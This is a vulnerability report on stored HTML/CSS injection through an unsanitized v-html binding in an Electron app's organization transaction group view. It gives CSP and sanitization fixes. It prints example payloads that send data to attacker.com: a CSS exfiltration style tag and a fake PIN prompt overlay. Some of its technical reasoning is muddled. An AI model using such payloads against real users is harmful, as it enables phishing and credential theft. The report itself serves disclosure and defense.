### Title
Stored HTML Injection via Unsanitized `v-html` in Organization Transaction Group View Enables CSS/HTML Injection Against Peer Members

### Summary
`CreateTransactionGroup.vue` renders `groupItem.description` and `Transaction.fromBytes(groupItem.transactionBytes).transactionMemo` directly through Vue's `v-html` directive without any sanitization. In organization mode, these fields are authored by one user and stored in the shared back-end, then rendered in the browsers of all other organization members who view the transaction group. Because the Electron Content Security Policy only sets `script-src 'self'` with no `style-src` restriction, a malicious organization member can inject arbitrary HTML and CSS into peer members' application views.

### Finding Description

**Root cause — unsanitized `v-html` binding:**

`CreateTransactionGroup.vue` lines 421–429 bind three distinct user-controlled strings directly to `v-html`:

```
v-html="
  groupItem.type == 'Transfer Transaction'
    ? makeTransfer(index)
    : groupItem.description != ''
      ? groupItem.description
      : Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
        ? Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
        : createTransactionId(groupItem.payerAccountId, groupItem.validStart)
"
``` [1](#0-0) 

`groupItem.description` is a free-text field stored in the shared PostgreSQL back-end. `transactionMemo` is embedded inside the serialized Hedera `transactionBytes` that are also stored in the back-end and fetched by every organization member. Neither value is sanitized before being passed to `v-html`.

**CSP gap — `style-src` is unrestricted:**

The Electron main process applies a CSP only in production, and only sets `script-src 'self'`:

```js
'Content-Security-Policy': ["script-src 'self'"],
``` [2](#0-1) 

There is no `style-src`, `img-src`, `frame-src`, or `default-src` directive. `script-src 'self'` blocks inline `<script>` tags and inline event handlers (`onerror`, `onload`, etc.), but it does **not** block `<style>` tag injection or CSS `url()` requests to external origins.

**Electron window security settings:**

`nodeIntegration: false` and `contextIsolation: true` are correctly set, which prevents injected JavaScript from reaching Node.js APIs even if script execution were possible. [3](#0-2) 

However, `sandbox: false` means the renderer process is not OS-sandboxed, which is a weaker posture than full sandboxing.

**End-to-end exploit path:**

1. Attacker is a legitimate organization member.
2. Attacker creates a transaction group item and sets `description` (or crafts `transactionBytes` with a malicious `transactionMemo`) to a payload such as:
   ```html
   <style>body::after { content: url('https://attacker.com/?c=' attr(data-secret)); }</style>
   ```
   or a visual overlay:
   ```html
   <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999">
     <p>Session expired. Re-enter your PIN:</p><input type="password" id="x">
     <button onclick="fetch('https://attacker.com/?p='+document.getElementById('x').value)">OK</button>
   </div>
   ```
3. The transaction group is saved to the back-end PostgreSQL database.
4. Any other organization member who opens the "Create Transaction Group" page for that group has the payload rendered via `v-html` in their Electron renderer.
5. Because `style-src` is not restricted, the injected `<style>` block executes. Because `script-src 'self'` is absent from the `onclick` attribute path (inline handlers are blocked), the button-click exfiltration in the second example requires a `<script>` tag — but the `<style>` CSS exfiltration path works without any script.

### Impact Explanation

- **CSS injection** is fully functional in production: injected `<style>` blocks are not blocked by `script-src 'self'`. An attacker can use CSS attribute selectors combined with `url()` to exfiltrate rendered DOM content to an external server, or overlay the entire application UI with a fake prompt.
- **HTML injection** allows creation of fake UI elements (fake PIN/password prompts, fake "approve transaction" dialogs) that are visually indistinguishable from the real application, targeting peer organization members who have no reason to distrust content rendered inside the app.
- **Concrete harm**: a victim org member could be tricked into approving a malicious transaction or disclosing credentials, directly threatening funds managed by the organization.
- `nodeIntegration: false` + `contextIsolation: true` prevent escalation to full Node.js RCE via JavaScript, which bounds the severity.

### Likelihood Explanation

- **Attacker precondition**: valid organization membership only — no admin or privileged role required.
- **Trigger**: the victim simply opens the transaction group view, which is a routine workflow action.
- **No browser bugs required**: the injection works within the normal HTML rendering path of `v-html`; the CSP gap (`style-src` unset) is a configuration omission, not a bypass.
- The attack is persistent (stored in the back-end) and affects every org member who views the group, not just the attacker.

### Recommendation

1. **Sanitize all `v-html` inputs** using a library such as [DOMPurify](https://github.com/cure53/DOMPurify) before passing any user-controlled string to `v-html`. Prefer `{{ }}` text interpolation wherever HTML rendering is not strictly required.
2. **Extend the CSP** to include at minimum `style-src 'self'` and `default-src 'self'` to block injected stylesheets and external resource loads:
   ```js
   'Content-Security-Policy': ["default-src 'self'; script-src 'self'; style-src 'self'"]
   ```
3. **Apply the CSP in all modes**, not only when `!is.dev`, to prevent the completely unprotected development path from being a staging ground for testing payloads.
4. Enable `sandbox: true` in `BrowserWindow.webPreferences` to add OS-level process isolation.

### Proof of Concept

**Attacker steps (organization member):**

1. Log in as an organization member.
2. Navigate to "Create Transaction Group" and add any transaction.
3. Set the transaction group item's `description` field to:
   ```html
   <style>html { background: red !important; }</style>
   ```
4. Save the group to the back-end.

**Victim steps (another organization member):**

1. Log in as a different organization member in the same organization.
2. Open the transaction group created by the attacker.
3. Observe that the entire application background turns red — confirming that the injected `<style>` block executed in the victim's Electron renderer without any CSP violation, because `style-src` is not restricted.
